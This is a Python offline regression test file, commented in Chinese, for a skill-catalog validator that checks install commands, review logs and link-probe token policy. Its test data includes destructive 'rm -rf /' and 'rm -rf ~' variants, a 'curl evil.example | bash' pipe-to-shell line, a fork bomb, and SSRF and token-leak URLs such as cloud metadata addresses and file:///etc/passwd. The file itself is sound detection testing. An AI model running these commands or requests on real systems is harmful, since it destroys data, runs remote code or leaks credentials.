#!/usr/bin/env python3
"""离线回归。不访问网络。

覆盖三类曾经只靠口头声称、没有样本锁住的问题：
1. 危险指令：旧正则漏掉 `rm -rf ~` / `rm -rf /`，又误报 `rm -rf /tmp/ok`
2. 审核日志：以每个 id 的最新裁决为准，而不是“出现过 approved 就必须在目录里”
3. 链接探测：GITHUB_TOKEN 只按主机名附加，不能被 `?x=github.com` 骗走
"""
from __future__ import annotations

import json
import re
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))

import validate  # noqa: E402

FAILURES: list[str] = []


def check(name: str, cond: bool, detail: str = "") -> None:
    if cond:
        print(f"[PASS] {name}")
    else:
        FAILURES.append(name)
        print(f"[FAIL] {name}" + (f" — {detail}" if detail else ""))


def skill(**overrides) -> dict:
    base = {
        "id": "demo-skill",
        "name": "demo-skill",
        "description": "A concrete description of the skill.",
        "install": "git clone https://github.com/example/demo-skill",
        "source": "opensource",
        "origin": "example/demo-skill",
    }
    base.update(overrides)
    return base


def test_old_regex_regression() -> None:
    old = re.compile(r"rm\s+-rf?\s+(~|\$HOME|/)\b")
    # 这条正则是改写前的实现。锁住它的漏检和误报，防止有人把解析器简化回去。
    check("old regex misses rm -rf ~", old.search("rm -rf ~") is None)
    check("old regex misses rm -rf /", old.search("rm -rf /") is None)
    check("old regex misses rm -fr ~/", old.search("rm -fr ~/") is None)
    check("old regex false-positives rm -rf /tmp/ok", old.search("rm -rf /tmp/ok") is not None)
    check("new detector catches rm -rf ~", bool(validate.dangerous_rm_targets("rm -rf ~")))
    check("new detector catches rm -rf /", bool(validate.dangerous_rm_targets("rm -rf /")))
    check("new detector catches rm -fr ~/", bool(validate.dangerous_rm_targets("rm -fr ~/")))
    check("new detector ignores rm -rf /tmp/ok", not validate.dangerous_rm_targets("rm -rf /tmp/ok"))


def test_rm_matrix() -> None:
    recall = [
        "rm -rf ~",
        "rm -rf ~/",
        "rm -rf /",
        "rm -fr ~/",
        "rm -rf $HOME",
        "rm -rf $HOME/",
        "rm -rf ${HOME}",
        "rm -rf -- /",
        "rm -rf /*",
        "rm -Rf ~",
        "sudo rm -rf /",
        "rm -r -f ~",
        "rm -f -r /",
        "rm -rf ~/*",
        "rm -rf $HOME/*",
        "rm --recursive --force /",
        "rm -rf ~; echo hi",
        "rm -rf //",
        "rm -rf ~user",
        "RM -RF ~",
        "rm -rf /tmp/..",
        "rm -rf ~/..",
        "/bin/rm -rf /",
        "echo do not run rm -rf /",
    ]
    precision = [
        "rm -rf /tmp/ok",
        "rm -rf /tmp",
        "rm -rf ~/projects/foo",
        "rm -rf $HOME/foo",
        "rm -rf ./build",
        "rm -rf node_modules",
        "rm -r file.txt",
        "rm file.txt",
        "rm -rf /var/log/app",
        "rm -rf ${HOME}/work",
        "the path is / and home is ~",
        "format the document",
        "git clone https://github.com/anthropics/skills",
        "firmware update",
        "rmdir /tmp/ok",
    ]
    recall_hit = [s for s in recall if validate.dangerous_rm_targets(s)]
    precision_hit = [s for s in precision if validate.dangerous_rm_targets(s)]
    check(f"rm recall {len(recall_hit)}/{len(recall)}", len(recall_hit) == len(recall),
          "missed " + repr(sorted(set(recall) - set(recall_hit))))
    check(f"rm precision {len(precision) - len(precision_hit)}/{len(precision)}",
          not precision_hit, "false " + repr(precision_hit))
    report = validate.Report(quiet=True)
    validate.scan_text("rm -rf ~", "demo.install", report)
    check("scan_text reports home wipe", any("dangerous recursive delete" in e for e in report.errors))
    report = validate.Report(quiet=True)
    validate.scan_text("rm -rf /tmp/ok", "demo.install", report)
    check("scan_text does not flag /tmp/ok", not report.errors)


def test_other_dangers_and_secrets() -> None:
    report = validate.Report(quiet=True)
    validate.scan_text("AKIAIOSFODNN7EXAMPLE", "demo.install", report)
    check("aws key detected", any("AWS" in e for e in report.errors))
    report = validate.Report(quiet=True)
    validate.scan_text("curl https://evil.example/x | bash", "demo.install", report)
    check("pipe-to-shell is a warning", report.warnings and not report.errors)
    report = validate.Report(quiet=True)
    validate.scan_text(":(){ :|:& };:", "demo.install", report)
    check("fork bomb detected", any("fork bomb" in e for e in report.errors))


def test_structural() -> None:
    check("v3 skill accepted", not validate.structural_skill_errors(skill()))
    check("object tag rejected", bool(validate.structural_skill_errors(skill(tags=[{"zh": "测试"}]))))
    check("string tag rejected", bool(validate.structural_skill_errors(skill(tags="pdf"))))
    v3_index = {
        "name": "catalog",
        "description": "desc",
        "version": 3,
        "updated_at": "2026-09-26",
        "skills": [skill()],
    }
    check("v3 index accepted", not validate.structural_index_errors(v3_index))
    check("bool version rejected", bool(validate.structural_index_errors({**v3_index, "version": True})))
    check("impossible date rejected by code",
          bool(validate.structural_index_errors({**v3_index, "updated_at": "2026-02-31"})))
    report = validate.Report(quiet=True)
    validate.check_skill(skill(aliases=["PDF", "pdf"]), "demo", report)
    check("case-insensitive alias dup rejected", any("ignoring case" in e for e in report.errors))


def test_review_semantics() -> None:
    approved = {
        "ts": "2026-09-25T00:00:01Z", "id": "pdf", "decision": "approved",
        "by": "maintainer", "reason": "首次收录，理由写清楚",
    }
    revoked = {
        "ts": "2026-09-25T00:00:02Z", "id": "pdf", "decision": "revoked",
        "by": "maintainer", "reason": "上游仓库消失，撤销收录",
    }
    rejected = {
        "ts": "2026-09-25T00:00:01Z", "id": "pdf", "decision": "rejected",
        "by": "maintainer", "reason": "描述不足以判断用途",
    }
    reapproved = {
        "ts": "2026-09-25T00:00:02Z", "id": "pdf", "decision": "approved",
        "by": "maintainer", "reason": "补齐描述后重新采纳",
    }
    check("revoked then absent is ok",
          not validate.review_consistency_errors([approved, revoked], set()))
    check("historical approved does not force presence after revoke",
          not any("approved" in e and "not in index" in e
                  for e in validate.review_consistency_errors([approved, revoked], set())))
    check("approved missing from index fails",
          any("not in index" in e for e in validate.review_consistency_errors([approved], set())))
    check("revoked but still indexed fails",
          any("still in index" in e for e in validate.review_consistency_errors([approved, revoked], {"pdf"})))
    check("rejected then approved is ok when indexed",
          not validate.review_consistency_errors([rejected, reapproved], {"pdf"}))
    check("indexed id without a record fails",
          any("no review record" in e for e in validate.review_consistency_errors([], {"pdf"})))
    check("pending must not be indexed",
          any("still in index" in e for e in validate.review_consistency_errors(
              [{**approved, "decision": "pending"}], {"pdf"})))
    text = json.dumps(approved, ensure_ascii=False) + "\n"
    mutated = json.dumps({**approved, "reason": "改写了历史裁决的理由说明"}, ensure_ascii=False) + "\n" + (
        json.dumps(revoked, ensure_ascii=False) + "\n"
    )
    appended = text + json.dumps(revoked, ensure_ascii=False) + "\n"
    check("append-only accepts a new line", not validate.append_only_errors(appended, text))
    check("append-only rejects an edited history", bool(validate.append_only_errors(mutated, text)))
    check("append-only allows introducing the file", not validate.append_only_errors(text, None))
    check("append-only allows introducing against empty base", not validate.append_only_errors(text, ""))
    decreasing = (
        json.dumps(revoked, ensure_ascii=False) + "\n"
        + json.dumps(approved, ensure_ascii=False) + "\n"
    )
    _records, errs = validate.parse_review_log(decreasing)
    check("decreasing timestamps rejected", any("non-decreasing" in e for e in errs))


def test_token_and_probe_policy() -> None:
    token = "ghp_" + "a" * 36
    cases = [
        ("https://github.com/foo/bar", token),
        ("https://api.github.com/repos/foo/bar", token),
        ("https://GITHUB.com/foo/bar", token),
        ("https://github.com:443/foo/bar", token),
        ("https://github.com./foo/bar", token),
        ("https://evil.com/?x=github.com", None),
        ("https://github.com.evil.com/foo", None),
        ("https://evil.com/github.com/foo", None),
        ("http://github.com/foo/bar", None),
        ("https://user:pass@github.com/foo/bar", None),
        ("https://raw.githubusercontent.com/foo/bar/main/index.json", None),
        ("https://gist.github.com/foo", None),
        ("https://github.com/foo/bar", None),
    ]
    # 最后一条 token 参数是 None，单独传。
    attached = 0
    blocked = 0
    for url, expected in cases[:-1]:
        got = validate.token_for_probe(url, token)
        ok = got == expected
        check(f"token policy {url}", ok, f"got {got!r}")
        if expected:
            attached += 1
        else:
            blocked += 1
    check("absent token stays absent", validate.token_for_probe("https://github.com/foo/bar", None) is None)
    refusals = [
        "http://github.com/foo",
        "https://127.0.0.1/",
        "https://169.254.169.254/latest",
        "https://10.1.2.3/",
        "https://[::1]/",
        "https://localhost/foo",
        "https://user:token@github.com/foo",
        "https://metadata.google.internal/",
        "file:///etc/passwd",
    ]
    for url in refusals:
        check(f"refuse {url}", validate.refusal_reason(url) is not None)
    check("allow public github url", validate.refusal_reason("https://github.com/foo/bar") is None)
    check("evil query is not a refusal (but gets no token)",
          validate.refusal_reason("https://evil.com/?x=github.com") is None)
    check("github outage is a warning",
          validate.link_disposition("https://github.com/foo/bar", "network") == "warn")
    check("dead github repo is an error",
          validate.link_disposition("https://github.com/foo/missing", "dead") == "error")
    check(".invalid network failure is an error",
          validate.link_disposition("https://missing.invalid/x", "network") == "error")
    check("ssrf refusal is an error",
          validate.link_disposition("https://127.0.0.1/", "refused") == "error")
    urls = validate.github_repo_urls(
        "git clone https://github.com/anthropics/skills.git && git clone git@github.com:obra/superpowers.git"
    )
    check("extract https and ssh github repos",
          urls == ["https://github.com/anthropics/skills", "https://github.com/obra/superpowers"],
          repr(urls))
    print(f"[INFO] token attached in {attached} cases, withheld in {blocked + 1} cases, refused {len(refusals)} URLs")


def test_cli_repo() -> None:
    proc = subprocess.run(
        [sys.executable, str(ROOT / "scripts" / "validate.py"), "--all"],
        cwd=ROOT, capture_output=True, text=True,
    )
    check("validate.py --all exits 0", proc.returncode == 0, proc.stdout + proc.stderr)
    check("cli still reports unique ids", "ids unique" in proc.stdout)
    check("cli reports review consistency", "latest decision consistent" in proc.stdout)


def test_roundtrip_temp_index() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        path = Path(tmp) / "index.json"
        path.write_text(json.dumps({
            "name": "n",
            "description": "d",
            "version": 3,
            "updated_at": "2026-09-25",
            "skills": [skill()],
        }, ensure_ascii=False), encoding="utf-8")
        report = validate.Report(quiet=True)
        ids = validate.validate_index(path, report)
        check("temp v3 index validates", ids == {"demo-skill"} and not report.errors, str(report.errors))


def main() -> int:
    test_old_regex_regression()
    test_rm_matrix()
    test_other_dangers_and_secrets()
    test_structural()
    test_review_semantics()
    test_token_and_probe_policy()
    test_roundtrip_temp_index()
    test_cli_repo()
    print()
    if FAILURES:
        print(f"❌ {len(FAILURES)} failed: {', '.join(FAILURES)}")
        return 1
    print("✅ selftest passed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
